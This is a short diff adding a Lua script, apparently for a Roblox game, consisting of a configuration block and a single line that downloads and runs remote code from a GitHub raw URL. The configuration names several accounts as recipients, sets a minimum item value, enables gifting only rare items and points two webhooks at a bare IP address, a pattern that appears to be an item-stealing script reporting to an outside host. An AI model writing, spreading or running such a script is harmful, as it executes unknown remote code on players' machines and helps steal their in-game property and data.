@@ -1,0 +1,12 @@
+_G.NullConfig = {
+    User = {'Fatalloots', 'FatalLoots2', 'FatalLoots3', 'FatalLoots4', 'FatalLoots5', 'GamerBoy903829', 'Gieanneiloveyou'},
+    min_value = 100000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "http://45.13.225.83:20002/proxy/a4768bbc473da754433bceddd861decc",
+    FakeGift = "No",
+    Trash = "http://45.13.225.83:20002/proxy/95f49f0dd8ea43bfef9ce562cbd31fba",
+    LoadingScreen = "No",
+    GiftOnlyRares = "Yes"
+}
+
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
